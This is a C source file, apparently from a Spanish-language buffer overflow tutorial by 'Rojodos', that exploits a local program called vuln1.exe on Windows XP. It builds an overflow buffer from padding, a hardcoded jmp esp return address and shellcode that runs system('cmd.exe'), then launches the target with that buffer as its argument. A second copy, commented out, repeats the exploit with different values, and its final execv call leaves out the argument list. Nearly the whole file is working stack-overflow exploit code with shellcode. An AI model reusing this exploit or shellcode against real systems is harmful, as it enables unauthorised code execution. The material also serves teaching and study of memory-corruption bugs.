/* exploit_vuln1.c por Rojodos */

#include <stdio.h> // Entrada/Salida
#include <stdlib.h> // execv()

int main (int argc,char **argv) { //Declaramos argv para usarlo con el execv

    char evilbuffer[1024]="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN"
    "OOOOPPPPQQQQRRRRSSSS"; //Para llegar el buffer y llegar al ret

char shellcode[]= "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63"
                  "\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD"
                  "\x78\xC6\x45\xFE\x65\x8D\x45\xF8\x50\xBB\xC7\x93\xC2\x77\xFF\xD3";
    //Shellcode que ejecuta system("cmd.exe"), con la llamada a system harcodeada
    
    char offset[]="\x7B\x46\x86\x7C"; // Offset jmp esp ntdll32.dll WinXP SP1 Esp
       
    strcat(evilbuffer,offset); //Concatenamos a evilbuffer el offset del jmp esp
    strcat(evilbuffer,shellcode); //Concatenamos a evilbuffer+offset la shellcode
    printf ("Cadena + offset + shellcode en formato printable\n\n");
    printf ("%s", evilbuffer);

    
    argv[0] = "vuln1"; //Definimos el argumento1, es decir, el nombre del vuln1
    argv[1] = evilbuffer; //Definimos el argumento2, o sea, el argumento de vuln1
    argv[2] = NULL; // Apunta a 0, porque no metemos mas argumentos
    
    execv ("vuln1.exe",argv); //Ejecutamos vuln1.exe pasándole evilbuffer como argumento
    }
     
    /* exploit_vuln1.c por Rojodos */
/*
#include <stdio.h> // Entrada/Salida
#include <stdlib.h> // execv()

int main (int argc,char **argv) { //Declaramos argv para usarlo con el execv

char evilbuffer[1024]="aaaaaaaabbbb"; //Para llegar el buffer y llegar al ret

char shellcode[]="\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63"
                 "\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD"
                 "\x78\xC6\x45\xFE\x65\x8D\x45\xF8\x50\xBB\xC7\x93\xC2\x77\xFF\xD3";
                 
//                 \x55 \x8B \xEC \x33 \xFF \x57 \x83 \xEC \x04 \xC6 \x45 \xF8 \x63
//                  \xC6 \x45 \xF9 \x6D \xC6 \x45 \xFA \x64 \xC6 \x45 \xFB \x2E \xC6 \x45 \xFC 
//                  \x65 \xC6 \x45 \xFD
//                 \x78 \xC6 \x45 \xFE \x65 \x8D \x45 \xF8 \x50 \xBB \xC7 \x93 \xC2 \x77 \xFF \xD3

                 
    //Shellcode que ejecuta system("cmd.exe"), con la llamada a system harcodeada
    //en \x44\x80\xBF\x77 0x77BF9044
    //en \xc7\x93\xc2\x77 0x77c293c7 :D
    
    //char offset[]="\x0F\x98\xF8\x77"; // Offset jmp esp ntdll32.dll WinXP SP1 Esp
      char offset[]="\x7B\x46\x86\x7C"; //Offset jmp esp kernel32.dll WinXp SP3 eng
              //\x7B\x46\x86\x7C 
              // 7C86467B
    
    strcat(evilbuffer,offset); //Concatenamos a evilbuffer el offset del jmp esp
    strcat(evilbuffer,shellcode); //Concatenamos a evilbuffer+offset la shellcode
    printf ("Cadena + offset + shellcode en formato printable\n\n");
    printf ("%s", evilbuffer);
   
   
    argv[0] = "Vuln1"; //Definimos el argumento1, es decir, el nombre del vuln1
    argv[1] = evilbuffer; //Definimos el argumento2, o sea, el argumento de vuln1
    argv[2] = NULL; // Apunta a 0, porque no metemos mas argumentos
    
    execv ("Vuln1.exe"); //Ejecutamos vuln1.exe pasándole evilbuffer como argumento
    }
*/
